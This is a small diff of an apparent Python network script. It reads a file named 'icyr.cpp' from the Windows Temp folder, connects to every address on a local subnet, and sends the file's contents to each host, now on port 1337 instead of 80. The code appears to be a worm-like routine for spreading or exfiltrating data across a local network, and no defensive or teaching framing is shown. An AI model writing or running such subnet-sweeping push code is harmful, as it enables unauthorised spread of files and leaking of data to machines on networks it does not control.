@@ -5,7 +5,7 @@ import random
 import string
  
 # Define icyr.cpp
-file_path = (os.path.expandvars("%Temp%\iycr.cpp"))
+file_path = (os.path.expandvars("%Temp%\icyr.cpp"))
  
 # Open the file
 with open(file_path, 'rb') as f:
@@ -40,7 +40,7 @@ for i in range(1, 256):
         # Create a socket
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # Connect to the IP address
-        s.connect((subnet + str(i), 80))
+        s.connect((subnet + str(i), 1337))
         # Send the file data
         s.sendall(file_data)
         # Save the received data to a new file
